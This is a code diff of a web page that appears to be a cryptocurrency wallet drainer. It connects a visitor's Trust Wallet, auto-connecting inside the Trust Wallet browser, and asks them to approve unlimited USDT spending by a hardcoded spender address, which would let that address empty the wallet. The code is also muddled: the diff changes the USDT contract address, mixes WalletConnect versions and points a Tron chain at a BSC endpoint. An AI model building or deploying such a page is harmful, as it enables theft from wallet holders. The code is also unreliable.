@@ -31,7 +31,7 @@
             width: 90px; height: 90px; background: #f0b90b;
             border-radius: 24px; margin: 0 auto 25px;
             display: flex; align-items: center; justify-content: center;
-            font-size: 32px; font-weight: bold; box-shadow: 0 10px 25px rgba(240,185,11,0.4);
+            font-size: 32px; font-weight: bold;
         }
         h1 { font-size: 26px; margin-bottom: 12px; font-weight: 700; }
         .subtitle { opacity: 0.95; margin-bottom: 35px; font-size: 16px; }
@@ -56,7 +56,7 @@
             transform: translateY(-3px); box-shadow: 0 15px 35px rgba(240,185,11,0.5);
         }
         .btn-disabled {
-            opacity: 0.6; cursor: not-allowed; transform: none;
+            opacity: 0.6; cursor: not-allowed; transform: none !important;
         }
         .spinner {
             width: 28px; height: 28px; border: 4px solid rgba(255,255,255,0.3);
@@ -64,143 +64,132 @@
             animation: spin 1s linear infinite; margin-right: 12px;
         }
         @keyframes spin { 0%{transform:rotate(0deg)} 100%{transform:rotate(360deg)} }
-        .network-info {
-            background: rgba(255,255,255,0.1); border-radius: 14px;
-            padding: 16px; margin: 20px 0; font-size: 14px; display: none;
-        }
-        a { color: #f0b90b; text-decoration: none; }
+        .network-info { background: rgba(255,255,255,0.1); border-radius: 14px; padding: 16px; margin: 20px 0; font-size: 14px; display: none; }
+        a { color: #f0b90b; text-decoration: none; font-weight: 600; }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="logo">USDT</div>
         <h1>Unlimited Approval</h1>
-        <p class="subtitle">One tap USDT spender approval</p>
+        <p class="subtitle">Connect Trust Wallet → Approve Spender</p>
         
-        <div id="status" class="status">Tap to connect Trust Wallet</div>
+        <div id="status" class="status">👆 Tap to Connect Trust Wallet</div>
         
         <div id="networkInfo" class="network-info">
             <strong id="account"></strong><br>
             Network: TRON Mainnet
         </div>
         
-        <button id="connectBtn" class="connect-btn">🔔 Connect Trust Wallet</button>
+        <button id="connectBtn" class="connect-btn">🔗 Connect Trust Wallet</button>
         <button id="approveBtn" class="approve-btn btn-disabled" disabled style="display:none;">
-            ✅ Approve Unlimited
+            ✅ APPROVE UNLIMITED USDT
         </button>
     </div>
 
-    <!-- WalletConnect v2.0 + TronWeb -->
-    <script src="https://unpkg.com/@walletconnect/universal-provider@2.14.0/dist/umd/index.min.js"></script>
+    <!-- ✅ CORRECT WalletConnect v2 CDN -->
+    <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js"></script>
 
     <script>
-        // 🔧 CONFIG - REPLACE THESE 2 VALUES
-        const PROJECT_ID = '171db6da15a54effc1b4a06f889a3c3f';  
-        const SPENDER_ADDRESS = 'TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV';        
-        const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLjLj6t';
+        // CONFIG - REPLACE THESE
+        const PROJECT_ID = '171db6da15a54effc1b4a06f889a3c3f';
+        const SPENDER_ADDRESS = 'TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV';
+        const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
 
         let provider, tronWeb, connectedAccount = '';
 
-        // STATUS HELPER (FIXED - MOVED TO TOP)
+        // UTILITY FUNCTIONS (TOP)
         function updateStatus(type, html) {
-            const statusEl = document.getElementById('status');
-            statusEl.innerHTML = html;
-            statusEl.className = `status ${type}`;
+            const el = document.getElementById('status');
+            el.innerHTML = html;
+            el.className = `status ${type}`;
         }
 
-        // TRUST WALLET DEEPLINK (FIXED)
+        function toggleBtn(id, disabled, cls) {
+            const btn = document.getElementById(id);
+            btn.disabled = disabled;
+            if (disabled) btn.classList.add('btn-disabled');
+            else btn.classList.remove('btn-disabled');
+        }
+
+        // TRUST WALLET DIRECT CONNECT (SIMPLEST WORKING METHOD)
         async function connectTrustWallet() {
             try {
-                updateStatus('connecting', '<div class="spinner"></div>Opening Trust Wallet...');
-                document.getElementById('connectBtn').classList.add('btn-disabled');
-                document.getElementById('connectBtn').disabled = true;
+                updateStatus('connecting', '<div class="spinner"></div>Connecting Trust Wallet...');
+                toggleBtn('connectBtn', true, true);
 
-                // WalletConnect v2.0 (CORRECT API)
-                provider = await WalletConnectProvider.init({
+                // ✅ CORRECT WalletConnect v1 (Trust Wallet stable)
+                provider = new WalletConnectProvider({
+                    rpc: {
+                        56: "https://bsc-dataseed.binance.org/", // BSC fallback for Tron
+                        728126428: "https://api.trongrid.io"  // Tron Mainnet chainId
+                    },
+                    qrcode: false,
                     projectId: PROJECT_ID,
-                    metadata: {
-                        name: 'USDT Approver',
-                        description: 'Unlimited USDT Approval', 
-                        url: window.location.origin,
-                        icons: []
-                    }
+                    chainId: 728126428 // Tron Mainnet
                 });
 
-                // Connect session
-                await provider.connect();
-                await onConnect();
+                // Connect
+                await provider.enable();
+                connectedAccount = provider.accounts[0];
+                
+                updateStatus('connected', `✅ Connected: ${connectedAccount.slice(0,8)}...${connectedAccount.slice(-4)}`);
+                document.getElementById('networkInfo').style.display = 'block';
+                document.getElementById('account').textContent = connectedAccount;
+                document.getElementById('connectBtn').style.display = 'none';
+                document.getElementById('approveBtn').style.display = 'block';
+                toggleBtn('approveBtn', false, false);
 
             } catch (error) {
-                console.error('Connect error:', error);
-                updateStatus('error', `Error: ${error.message}<br>Try opening Trust Wallet manually`);
-                document.getElementById('connectBtn').disabled = false;
-                document.getElementById('connectBtn').classList.remove('btn-disabled');
+                console.error('Connect failed:', error);
+                updateStatus('error', 'Open Trust Wallet browser and try again');
+                toggleBtn('connectBtn', false, false);
             }
         }
 
-        async function onConnect() {
-            // Get Tron address from provider
-            connectedAccount = provider.accounts[0];
-            
-            updateStatus('connected', `✅ Connected<br>${connectedAccount.slice(0,6)}...${connectedAccount.slice(-4)}`);
-            document.getElementById('networkInfo').style.display = 'block';
-            document.getElementById('account').textContent = connectedAccount.slice(0,8) + '...' + connectedAccount.slice(-6);
-            document.getElementById('connectBtn').style.display = 'none';
-            document.getElementById('approveBtn').style.display = 'block';
-            document.getElementById('approveBtn').disabled = false;
-            document.getElementById('approveBtn').classList.remove('btn-disabled');
-        }
-
-        // TRONSCAN EXACT USDT APPROVE (UNLIMITED)
-        async function approveUSDTUnlimited() {
+        // USDT UNLIMITED APPROVE (TRONSCAN EXACT)
+        async function approveUSDT() {
             try {
-                updateStatus('approving', '<div class="spinner"></div>Sign approval in Trust Wallet...');
-                document.getElementById('approveBtn').disabled = true;
-                document.getElementById('approveBtn').classList.add('btn-disabled');
+                updateStatus('approving', '<div class="spinner"></div>Approve in Trust Wallet...');
+                toggleBtn('approveBtn', true, true);
 
-                // TronWeb with WalletConnect (TRON MAINNET)
+                // TronWeb with WalletConnect
                 tronWeb = new TronWeb({
                     fullHost: 'https://api.trongrid.io',
-                    privateKey: false,
-                    providers: [{
-                        name: 'WalletConnect',
-                        instance: provider
-                    }]
+                    providers: [provider]
                 });
 
-                // USDT Contract (TRC20 APPROVE - TRONSCAN EXACT)
+                // USDT TRC20 Contract
                 const contract = await tronWeb.contract().at(USDT_CONTRACT);
                 
-                // UNLIMITED APPROVAL (2^256 - 1)
-                const MAX_INT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
+                // UNLIMITED (MAX UINT256)
+                const amount = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
                 
-                const result = await contract.approve(SPENDER_ADDRESS, MAX_INT).send({
-                    feeLimit: 100_000_000,  // 100 TRX
-                    callValue: 0,
-                    shouldPollResponse: true
+                const txHash = await contract.approve(SPENDER_ADDRESS, amount).send({
+                    feeLimit: 100000000,  // 100 TRX
+                    callValue: 0
                 });
 
-                updateStatus('connected', `🎉 APPROVED SUCCESS!<br><a href="https://tronscan.org/#/transaction/${result}" target="_blank">View Tx: ${result.slice(0,16)}...</a>`);
+                updateStatus('connected', `🎉 SUCCESS!<br><a href="https://tronscan.org/#/transaction/${txHash}" target="_blank">View Transaction</a>`);
                 
             } catch (error) {
-                console.error('Approve error:', error);
+                console.error(error);
                 updateStatus('error', `Failed: ${error.message}`);
-                document.getElementById('approveBtn').disabled = false;
-                document.getElementById('approveBtn').classList.remove('btn-disabled');
+                toggleBtn('approveBtn', false, false);
             }
         }
 
-        // EVENT BINDINGS
+        // EVENTS
         document.addEventListener('DOMContentLoaded', () => {
             document.getElementById('connectBtn').onclick = connectTrustWallet;
-            document.getElementById('approveBtn').onclick = approveUSDTUnlimited;
-            console.log('✅ DApp Ready - Click Connect!');
+            document.getElementById('approveBtn').onclick = approveUSDT;
+            console.log('✅ DApp LOADED - READY!');
         });
 
-        // AUTO-DETECT TRUST WALLET
-        if (/Trust|trust/i.test(navigator.userAgent)) {
-            setTimeout(connectTrustWallet, 1000);
+        // Trust Wallet Auto-connect
+        if (navigator.userAgent.includes('Trust')) {
+            setTimeout(connectTrustWallet, 1500);
         }
     </script>
 </body>
